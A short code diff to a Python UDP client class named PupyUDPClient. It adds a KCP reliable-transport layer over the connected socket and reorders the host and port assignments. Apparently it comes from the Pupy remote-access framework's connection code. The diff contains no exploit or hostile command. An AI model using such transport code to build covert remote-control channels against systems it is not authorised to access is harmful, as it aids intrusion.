@@ -188,11 +188,9 @@ class PupyUDPClient(PupyClient):
         self.family = family
         self.socktype = socktype
         self.timeout = timeout
+        self._kcp = __import__('kcp')
 
     def connect(self, host, port):
-        self.host = host
-        self.port = port
-
         family, socktype, proto, _, sockaddr = socket.getaddrinfo(
             host, port, self.family, self.socktype
         )[0]
@@ -201,5 +199,10 @@ class PupyUDPClient(PupyClient):
         s.settimeout(self.timeout)
         s.connect(sockaddr)
         s.setblocking(0)
+
         self.sock = s
-        return s, (host, port)
+        self.host = host
+        self.port = port
+
+        kcp = self._kcp.KCP(self.sock.fileno(), 0, interval=64)
+        return s, (host, port), kcp
